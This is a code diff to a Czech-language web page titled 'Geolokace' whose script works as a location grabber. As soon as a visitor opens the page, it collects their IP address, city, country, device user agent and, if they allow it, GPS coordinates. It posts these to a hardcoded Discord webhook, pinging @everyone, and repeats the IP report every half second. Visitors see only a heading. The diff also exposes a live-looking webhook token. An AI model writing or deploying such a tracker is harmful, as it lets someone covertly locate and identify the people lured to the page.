@@ -4,47 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Geolokace</title>
+</head>
+<body>
+    <h1>Geolokace a informace o zařízení</h1>
+
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Tvůj webhook
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
 
-        let gpsConfirmed = false; // Indikátor pro potvrzenou GPS
-
-        // Funkce pro získání informací o zařízení a IP
-        function getDeviceAndIP() {
-            let device = navigator.userAgent; // Detekce zařízení
-            let vpnStatus = "VPN: FALSE"; // Defaultně nastavíme VPN jako FALSE
-
-            // Získání IP a informací o VPN
-            fetch("https://ipinfo.io/json")
-            .then(response => response.json())
-            .then(data => {
-                // Zjištění, zda je používána VPN (v tomto případě dle informací z ipinfo.io)
-                if (data.org && data.org.includes("VPN")) {
-                    vpnStatus = "VPN: TRUE";
-                }
-
-                // Vytvoření zprávy s informacemi o zařízení a VPN
-                const message = `📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\n${vpnStatus}`;
-
-                // Pokud je GPS potvrzena, přidáme GPS data
-                if (gpsConfirmed) {
-                    navigator.geolocation.getCurrentPosition(position => {
-                        const lat = position.coords.latitude.toFixed(6);
-                        const lon = position.coords.longitude.toFixed(6);
-                        sendToDiscord(`${message}\n📍 GPS: ${lat}, ${lon}`);
-                    }, () => {
-                        // Pokud GPS není dostupná, pošleme zprávu bez GPS
-                        sendToDiscord(message);
-                    });
-                } else {
-                    // Pokud GPS není potvrzena, pošleme zprávu bez GPS
-                    sendToDiscord(message);
-                }
-            })
-            .catch(error => console.error("Chyba získání IP:", error));
-        }
-
-        // Funkce pro odeslání zprávy na Discord
         function sendToDiscord(message) {
             fetch(WEBHOOK_URL, {
                 method: "POST",
@@ -53,34 +19,43 @@
             }).catch(error => console.error("Chyba odesílání:", error));
         }
 
-        // Funkce pro spuštění odesílání každých 0,5 sekundy
-        function startSending() {
-            setInterval(getDeviceAndIP, 500); // Odesílání každých 500ms (0,5 sekundy)
+        function getIP(device, gpsData) {
+            fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: FALSE\n${gpsData}`;
+
+                sendToDiscord(message);
+            })
+            .catch(error => console.error("Chyba získání IP:", error));
         }
 
-        // Funkce pro zjištění GPS
-        function requestGPSPermission() {
+        function getLocation() {
+            let device = navigator.userAgent; // Detekce zařízení
+
+            // Odesílání IP a zařízení ihned po načtení stránky
+            getIP(device, "🚫 GPS není potvrzena");
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(() => {
-                    gpsConfirmed = true; // Pokud uživatel potvrdí GPS, nastavíme flag
-                    sendToDiscord("📍 GPS potvrzena.");
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
+                    getIP(device, `📍 GPS: ${lat}, ${lon}`);
                 }, () => {
-                    gpsConfirmed = false; // Pokud GPS zamítne, nastavíme flag
-                    sendToDiscord("🚫 GPS zamítnuta.");
+                    getIP(device, "🚫 GPS zamítnuta");
                 });
-            } else {
-                gpsConfirmed = false;
-                sendToDiscord("🚫 GPS není podporována.");
             }
         }
 
-        // Spuštění funkce při načtení stránky
         window.onload = function() {
-            startSending(); // Začneme posílat informace každých 0,5 sekundy
-            requestGPSPermission(); // Požádáme o potvrzení GPS
+            getLocation();
+
+            // Interval pro odesílání IP a zařízení každých 0,5 sekundy
+            setInterval(() => {
+                let device = navigator.userAgent;
+                getIP(device, "🚫 GPS není potvrzena");
+            }, 500); // 500 ms = 0,5 sekundy
         };
     </script>
-</head>
-<body>
 </body>
 </html>
